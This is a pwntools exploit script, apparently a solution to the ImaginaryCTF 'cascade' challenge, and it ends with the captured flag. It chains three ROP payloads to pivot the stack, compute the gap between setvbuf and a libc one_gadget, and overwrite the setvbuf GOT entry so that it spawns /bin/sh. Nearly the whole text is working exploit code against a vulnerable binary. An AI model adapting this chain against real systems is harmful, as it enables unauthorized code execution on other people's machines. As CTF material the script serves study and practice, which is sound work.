from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./vuln_patched', '''
    b *0x401173
    b *0x40112c
    b *0x40113c
    continue
''')

# p = remote('cascade.chal.imaginaryctf.org', 1337)

GADGET_1 = 0x4011c9  # main: mov eax, 0; pop rbp; ret;
GADGET_2 = 0x4011cf  # main: ret;
GADGET_3 = 0x401162  # vuln: lea rax, [rbp-0x40]; mov edx, 0x100; mov rsi, rax; mov edi, 0x0; call 0x401050 <read@plt>; nop; leave; ret;
GADGET_4 = 0x40107d  # _start: and rsp, 0xfffffffffffffff0; push rax; push rsp; xor r8d, r8d; xor ecx, ecx; mov rdi, 0x40117b; call qword ptr [rip+0x2f43] <__libc_start_main_impl>; (mov rbx, rdx; ... call main;)
GADGET_5 = 0x40112c  # __do_global_dtors_aux: adc edx, dword ptr [rbp+0x48]; mov ebp, esp; call 0x4010b0; mov byte ptr [rip+0x2efb], 1; pop rbp; ret;
GADGET_6 = 0x40113c  # __do_global_dtors_aux: add dword ptr [rbp-0x3d], ebx; nop; ret;

SETVBUF_PLT = 0x401060  # setvbuf@plt
SETVBUF_GOT = 0x404008  # setvbuf@got
STACK_PIVOT_TARGET = 0x404800
FAKE_RBP = 0x405000

'''
0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
'''
one_gadget_off = 0xef52b

glibc_e = ELF('./libc.so.6')

# 1. first ROP: prepare for second ROP and stack pivot to 0x404800
payload1 = b'A'*0x48  # pad 0x48 bytes
payload1 += p64(GADGET_1)+p64(STACK_PIVOT_TARGET-8)  # rbp=0x4047f8
payload1 += p64(GADGET_3)  # call read function in main to read second ROP payload to rbp-0x40=0x4047b8; "leave; ret;" instructions in main will perform stack pivot to 0x404800
p.send(payload1)
pause()

# 2. second ROP: put difference of setvbuf and one gadget into appropriate register and prepare for third ROP
payload2 = b'B'*0x40  # pad 0x40 bytes
payload2 += p64(0x100000000-(glibc_e.sym.setvbuf-one_gadget_off)-0x200-1)  # write difference -(glibc_setvbuf_addr-glibc_onegadget_addr)-0x200-1=0x100066dda into 0x4047f8
payload2 += p64(GADGET_1)+p64(STACK_PIVOT_TARGET-8-0x48)  # rbp=0x4047b0
payload2 += p64(GADGET_5)+p64(0)  # rdx=1+rdx+*(rbp+0x48)=0x200+*0x4047f8=1+0x200-(glibc_setvbuf_addr-glibc_onegadget_addr)-0x200-1=0x66fdb; rbp=0
payload2 += p64(GADGET_4)  # call __libc_start_main function in _start to execute "mov rbx, rdx;" instruction to make rbx=rdx=0x66fdb and totally restart main to read third ROP payload
p.send(payload2)
pause()

# 3. third ROP: add difference of setvbuf and one gadget to setvbuf entry in GOT table and prepare for system('/bin/sh\x00')
payload3  = b'C'*0x48  # pad 0x48 bytes
payload3 += p64(GADGET_1)+p64(SETVBUF_GOT+0x3d)  # rbp=SETVBUF_GOT+0x3d
payload3 += p64(GADGET_6)  # *(rbp-0x3d)=*(rbp-0x3d)+rbx=*SETVBUF_GOT+0x66fdb=glibc_setvbuf_addr-(glibc_setvbuf_addr-glibc_onegadget_addr)=glibc_onegadget_addr
payload3 += p64(GADGET_1)+p64(FAKE_RBP)  # rbp=0x405000
payload3 += p64(GADGET_2)  # align rsp to 0x10 bytes
payload3 += p64(SETVBUF_PLT)  # call setvbuf function in plt toto trigger one gadget
p.send(payload3)
pause()

p.interactive()

# ictf{i_h0pe_y0u_didnt_use_ret2dl_94b51175}